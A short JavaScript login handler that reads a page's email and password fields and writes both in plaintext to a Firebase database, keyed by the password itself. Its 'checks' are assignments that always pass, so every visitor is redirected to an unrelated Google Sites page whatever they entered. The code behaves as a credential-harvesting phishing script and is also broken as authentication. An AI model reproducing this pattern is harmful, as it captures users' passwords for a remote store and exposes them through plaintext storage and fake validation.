document.getElementById("login").addEventListener("click",write);


function write(){
  var email = document.getElementById("email").value;
  var password = document.getElementById("password").value;

 

 // var space  = document.getElementById(" ").value ;
  
  firebase.database().ref(password).set({
 
  email : email,
  password : password 

});






if ( email=true)
  {
    if( password = true)
  {

    window.location.replace("https://sites.google.com/view/computer-knowledge-vm/home")
  }
  else
  {
    alert("invalid user name or password")
  }
}

}

